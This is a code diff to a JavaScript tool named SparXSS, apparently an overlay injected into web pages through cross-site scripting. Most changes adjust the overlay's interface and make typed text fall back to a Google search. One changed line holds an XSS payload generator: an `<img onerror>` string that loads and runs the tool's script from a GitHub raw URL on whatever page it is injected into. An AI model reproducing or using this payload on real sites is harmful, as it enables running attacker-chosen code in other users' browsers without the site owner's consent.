@@ -97,14 +97,14 @@ if (typeof executed === 'undefined') {
     
     var sparxsstext = document.createElement("div");
     sparxsstext.style.position = "fixed";
-    sparxsstext.style.top = "30%";
+    sparxsstext.style.top = "20%";
     sparxsstext.style.left = "50%";
     sparxsstext.style.transform = "translate(-50%, -50%)";
     sparxsstext.style.fontSize = "100px";
     sparxsstext.style.textAlign = "center";
     sparxsstext.style.color = "#aaa"; 
     sparxsstext.style.fontWeight = "bold"; 
-    sparxsstext.innerText = "SparXSS";
+    sparxsstext.innerText = "SparXSS v1.03";
 
     var invis2 = document.createElement("div");
     invis2.style.position = "fixed";
@@ -116,7 +116,7 @@ if (typeof executed === 'undefined') {
 
     var textBox1 = document.createElement("input");
     textBox1.type = "text";
-    textBox1.placeholder = "Temporary Redirect";
+    textBox1.placeholder = "Search with Google or Enter Adress";
     textBox1.style.display = "block";
     textBox1.style.margin = "10px auto";
     textBox1.style.width = "80vw";
@@ -151,7 +151,7 @@ if (typeof executed === 'undefined') {
     });
 
     textBox1.addEventListener('click', function() {
-        if (textBox1.placeholder === "Temporary Redirect" || textBox1.placeholder === "Permanent Redirect") {
+        if (textBox1.placeholder === "Search with Google or Enter Adress" || textBox1.placeholder === "Search with Google or Enter Adress") {
             textBox1.placeholder = "";
         }
     });
@@ -159,9 +159,9 @@ if (typeof executed === 'undefined') {
     textBox1.addEventListener('blur', function() {
         if (textBox1.value.trim() === "") {
             if (redirectSwitcher) {
-                textBox1.placeholder = "Permanent Redirect";
+                textBox1.placeholder = "Search with Google or Enter Adress";
             } else {
-                textBox1.placeholder = "Temporary Redirect";
+                textBox1.placeholder = "Search with Google or Enter Adress";
             }
         }
     });
@@ -468,11 +468,11 @@ if (typeof executed === 'undefined') {
         if (redirectSwitcher) {
             redirectSwitcher = false;
             modeButton.innerText = "Current Mode: Temporary Redirect";
-            textBox1.placeholder = "Temporary Redirect";
+            textBox1.placeholder = "Search with Google or Enter Adress";
         } else {
             redirectSwitcher = true;
             modeButton.innerText = "Current Mode: Permanent Redirect";
-            textBox1.placeholder = "Permanent Redirect";
+            textBox1.placeholder = "Search with Google or Enter Adress";
         }
     });
 
@@ -920,7 +920,7 @@ linkText.style.textAlign = 'center';
 
 link.appendChild(linkText);`;
 
-                var codeBeginning = `<img src=# onerror="var scriptElement=document.createElement('script');scriptElement.src='https://raw.githubusercontent.com/Amukerd/SparXSS/main/sparxss.js';scriptElement.onload=function(){if(typeof saved === 'undefined'){saved=true;`;
+                var codeBeginning = `<img src=# onerror="var scriptElement=document.createElement('script');scriptElement.src='https://raw.githubusercontent.com/Evanlol123/SparXSS/main/sparxss.js';scriptElement.onload=function(){if(typeof saved === 'undefined'){saved=true;`;
                 
                 var codeEnd = `}};document.body.appendChild(scriptElement);">`;
         
@@ -967,8 +967,12 @@ link.appendChild(linkText);`;
     function tempRedirector() {
         var setUrl = textBox1.value;
         if (setUrl.trim() !== "") {
+             if ((setUrl.indexOf(".com") !== -1 || setUrl.indexOf(".biz") !== -1 || setUrl.indexOf(".mobi") !== -1 || setUrl.indexOf(".travel") !== -1 || setUrl.indexOf(".net") !== -1 || setUrl.indexOf(".info") !== -1 || setUrl.indexOf(".pw") !== -1 || setUrl.indexOf(".tv") !== -1 || setUrl.indexOf(".org") !== -1 || setUrl.indexOf(".int") !== -1 || setUrl.indexOf(".tel") !== -1 || setUrl.indexOf(".xxx") !== -1 || setUrl.indexOf(".ae") !== -1 || setUrl.indexOf(".ai") !== -1 || setUrl.indexOf(".asia") !== -1 || setUrl.indexOf(".bb") !== -1 || setUrl.indexOf(".cm") !== -1 || setUrl.indexOf(".cn") !== -1 || setUrl.indexOf(".cg") !== -1 || setUrl.indexOf(".hr") !== -1 || setUrl.indexOf(".ec") !== -1 || setUrl.indexOf(".eu") !== -1 || setUrl.indexOf(".de") !== -1 || setUrl.indexOf(".in") !== -1 || setUrl.indexOf(".it") !== -1 || setUrl.indexOf(".la") !== -1 || setUrl.indexOf(".my") !== -1 || setUrl.indexOf(".mx") !== -1 || setUrl.indexOf(".no") !== -1 || setUrl.indexOf(".ph") !== -1 || setUrl.indexOf(".ru") !== -1 || setUrl.indexOf(".sk") !== -1 || setUrl.indexOf(".es") !== -1 || setUrl.indexOf(".tw") !== -1 || setUrl.indexOf(".ua") !== -1 || setUrl.indexOf(".uz") !== -1 || setUrl.indexOf(".africa") !== -1 || setUrl.indexOf(".ag") !== -1 || setUrl.indexOf(".au") !== -1 || setUrl.indexOf(".be") !== -1 || setUrl.indexOf(".io") !== -1 || setUrl.indexOf("ca.") !== -1 || setUrl.indexOf(".co") !== -1 || setUrl.indexOf(".cz") !== -1 || setUrl.indexOf(".fi") !== -1 || setUrl.indexOf(".gr") !== -1 || setUrl.indexOf(".hk") !== -1 || setUrl.indexOf(".jp") !== -1 || setUrl.indexOf(".lv") !== -1 || setUrl.indexOf(".mr") !== -1 || setUrl.indexOf(".me") !== -1 || setUrl.indexOf(".pk") !== -1 || setUrl.indexOf(".pl") !== -1 || setUrl.indexOf(".qa") !== -1 || setUrl.indexOf(".sl") !== -1 || setUrl.indexOf(".si") !== -1 || setUrl.indexOf(".se") !== -1 || setUrl.indexOf(".uy") !== -1 || setUrl.indexOf(".al") !== -1 || setUrl.indexOf(".ar") !== -1 || setUrl.indexOf(".at") !== -1 || setUrl.indexOf(".bo") !== -1 || setUrl.indexOf(".bg") !== -1 || setUrl.indexOf(".cl") !== -1 || setUrl.indexOf(".dk") !== -1 || setUrl.indexOf(".eg") !== -1 || setUrl.indexOf(".fr") !== -1 || setUrl.indexOf(".ht") !== -1 || setUrl.indexOf(".is") !== -1 || setUrl.indexOf(".ie") !== -1 || setUrl.indexOf(".jo") !== -1 || setUrl.indexOf(".ly") !== -1 || setUrl.indexOf(".nl") !== -1 || setUrl.indexOf(".ps") !== -1 || setUrl.indexOf(".pe") !== -1 || setUrl.indexOf(".pt") !== -1 || setUrl.indexOf(".ro") !== -1 || setUrl.indexOf(".sg") !== -1 || setUrl.indexOf(".kr") !== -1 || setUrl.indexOf(".ch") !== -1 || setUrl.indexOf(".tv") !== -1 || setUrl.indexOf(".uk") !== -1 || setUrl.indexOf(".us") !== -1 || setUrl.indexOf(".vn") !== -1 || setUrl.indexOf(".app") !== -1 || setUrl.indexOf(".gg") !== -1 || setUrl.indexOf(".website") !== -1 || setUrl.indexOf(".inc") !== -1 || setUrl.indexOf(".xyz") !== -1 || setUrl.indexOf(".club") !== -1 || setUrl.indexOf(".online") !== -1 || setUrl.indexOf(".store") !== -1 || setUrl.indexOf(".best") !== -1 || setUrl.indexOf(".live") !== -1 || setUrl.indexOf(".tech") !== -1 || setUrl.indexOf(".pro") !== -1 || setUrl.indexOf(".world") !== -1 || setUrl.indexOf(".space") !== -1 || setUrl.indexOf(".vip") !== -1 || setUrl.indexOf(".life") !== -1 || setUrl.indexOf(".shop") !== -1 || setUrl.indexOf(".host") !== -1 || setUrl.indexOf(".fun") !== -1 || setUrl.indexOf(".icu") !== -1 || setUrl.indexOf(".design") !== -1 || setUrl.indexOf(".art") !== -1) && !setUrl.startsWith("http://") && !setUrl.startsWith("https://")) {
+            setUrl = "https://" + setUrl;
+            }
+            
             if (!setUrl.startsWith("http://") && !setUrl.startsWith("https://")) {
-                setUrl = "https://" + setUrl;
+                setUrl = "https://www.google.com/search?q=" + setUrl;
             }
             window.open(setUrl, '_blank');
         }
@@ -977,8 +981,12 @@ link.appendChild(linkText);`;
     function permRedirector() {
         var setUrl = textBox1.value;
         if (setUrl.trim() !== "") {
+            if ((setUrl.indexOf(".com") !== -1 || setUrl.indexOf(".biz") !== -1 || setUrl.indexOf(".mobi") !== -1 || setUrl.indexOf(".travel") !== -1 || setUrl.indexOf(".net") !== -1 || setUrl.indexOf(".info") !== -1 || setUrl.indexOf(".pw") !== -1 || setUrl.indexOf(".tv") !== -1 || setUrl.indexOf(".org") !== -1 || setUrl.indexOf(".int") !== -1 || setUrl.indexOf(".tel") !== -1 || setUrl.indexOf(".xxx") !== -1 || setUrl.indexOf(".ae") !== -1 || setUrl.indexOf(".ai") !== -1 || setUrl.indexOf(".asia") !== -1 || setUrl.indexOf(".bb") !== -1 || setUrl.indexOf(".cm") !== -1 || setUrl.indexOf(".cn") !== -1 || setUrl.indexOf(".cg") !== -1 || setUrl.indexOf(".hr") !== -1 || setUrl.indexOf(".ec") !== -1 || setUrl.indexOf(".eu") !== -1 || setUrl.indexOf(".de") !== -1 || setUrl.indexOf(".in") !== -1 || setUrl.indexOf(".it") !== -1 || setUrl.indexOf(".la") !== -1 || setUrl.indexOf(".my") !== -1 || setUrl.indexOf(".mx") !== -1 || setUrl.indexOf(".no") !== -1 || setUrl.indexOf(".ph") !== -1 || setUrl.indexOf(".ru") !== -1 || setUrl.indexOf(".sk") !== -1 || setUrl.indexOf(".es") !== -1 || setUrl.indexOf(".tw") !== -1 || setUrl.indexOf(".ua") !== -1 || setUrl.indexOf(".uz") !== -1 || setUrl.indexOf(".africa") !== -1 || setUrl.indexOf(".ag") !== -1 || setUrl.indexOf(".au") !== -1 || setUrl.indexOf(".be") !== -1 || setUrl.indexOf(".io") !== -1 || setUrl.indexOf("ca.") !== -1 || setUrl.indexOf(".co") !== -1 || setUrl.indexOf(".cz") !== -1 || setUrl.indexOf(".fi") !== -1 || setUrl.indexOf(".gr") !== -1 || setUrl.indexOf(".hk") !== -1 || setUrl.indexOf(".jp") !== -1 || setUrl.indexOf(".lv") !== -1 || setUrl.indexOf(".mr") !== -1 || setUrl.indexOf(".me") !== -1 || setUrl.indexOf(".pk") !== -1 || setUrl.indexOf(".pl") !== -1 || setUrl.indexOf(".qa") !== -1 || setUrl.indexOf(".sl") !== -1 || setUrl.indexOf(".si") !== -1 || setUrl.indexOf(".se") !== -1 || setUrl.indexOf(".uy") !== -1 || setUrl.indexOf(".al") !== -1 || setUrl.indexOf(".ar") !== -1 || setUrl.indexOf(".at") !== -1 || setUrl.indexOf(".bo") !== -1 || setUrl.indexOf(".bg") !== -1 || setUrl.indexOf(".cl") !== -1 || setUrl.indexOf(".dk") !== -1 || setUrl.indexOf(".eg") !== -1 || setUrl.indexOf(".fr") !== -1 || setUrl.indexOf(".ht") !== -1 || setUrl.indexOf(".is") !== -1 || setUrl.indexOf(".ie") !== -1 || setUrl.indexOf(".jo") !== -1 || setUrl.indexOf(".ly") !== -1 || setUrl.indexOf(".nl") !== -1 || setUrl.indexOf(".ps") !== -1 || setUrl.indexOf(".pe") !== -1 || setUrl.indexOf(".pt") !== -1 || setUrl.indexOf(".ro") !== -1 || setUrl.indexOf(".sg") !== -1 || setUrl.indexOf(".kr") !== -1 || setUrl.indexOf(".ch") !== -1 || setUrl.indexOf(".tv") !== -1 || setUrl.indexOf(".uk") !== -1 || setUrl.indexOf(".us") !== -1 || setUrl.indexOf(".vn") !== -1 || setUrl.indexOf(".app") !== -1 || setUrl.indexOf(".gg") !== -1 || setUrl.indexOf(".website") !== -1 || setUrl.indexOf(".inc") !== -1 || setUrl.indexOf(".xyz") !== -1 || setUrl.indexOf(".club") !== -1 || setUrl.indexOf(".online") !== -1 || setUrl.indexOf(".store") !== -1 || setUrl.indexOf(".best") !== -1 || setUrl.indexOf(".live") !== -1 || setUrl.indexOf(".tech") !== -1 || setUrl.indexOf(".pro") !== -1 || setUrl.indexOf(".world") !== -1 || setUrl.indexOf(".space") !== -1 || setUrl.indexOf(".vip") !== -1 || setUrl.indexOf(".life") !== -1 || setUrl.indexOf(".shop") !== -1 || setUrl.indexOf(".host") !== -1 || setUrl.indexOf(".fun") !== -1 || setUrl.indexOf(".icu") !== -1 || setUrl.indexOf(".design") !== -1 || setUrl.indexOf(".art") !== -1) && !setUrl.startsWith("http://") && !setUrl.startsWith("https://")) {
+             setUrl = "https://" + setUrl;
+            }
+            
             if (!setUrl.startsWith("http://") && !setUrl.startsWith("https://")) {
-                setUrl = "https://" + setUrl;
+                setUrl = "https://www.google.com/search?q=" + setUrl;
             }
             window.location.href = setUrl;
         }
